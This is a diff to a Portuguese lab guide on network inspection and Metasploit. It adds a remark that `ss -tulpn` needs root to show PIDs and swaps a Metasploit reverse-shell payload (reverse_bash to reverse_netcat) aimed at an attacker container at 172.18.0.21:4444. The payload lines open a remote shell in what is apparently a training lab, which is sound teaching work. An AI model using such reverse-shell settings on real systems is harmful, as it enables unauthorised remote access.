@@ -248,6 +248,7 @@ ss -tulpn 'sport = :8080'
 
 **Componentes do comando:**
 
+- usuario necessita ser root para retornar o pid
 - `sport = :8080`: filtra sockets cujo porto local de origem é `8080`.
 - `-p`: exibe o processo associado, incluindo nome, PID e descritor de arquivo quando temos permissão para enxergar essa informação.
 
@@ -911,7 +912,7 @@ Se o Metasploit retornar erro semelhante a:
 isso indica que o módulo está configurado com um payload que precisa receber uma conexão reversa. Nesse caso, `LHOST` deve ser o IP do **atacante**, não o IP do alvo. No nosso laboratório, o container `atacante_kali` está em `172.18.0.21`, portanto um ajuste possível seria:
 
 ```text
-set payload cmd/unix/reverse_bash
+set payload cmd/unix/reverse_netcat
 set LHOST 172.18.0.21
 set LPORT 4444
 run
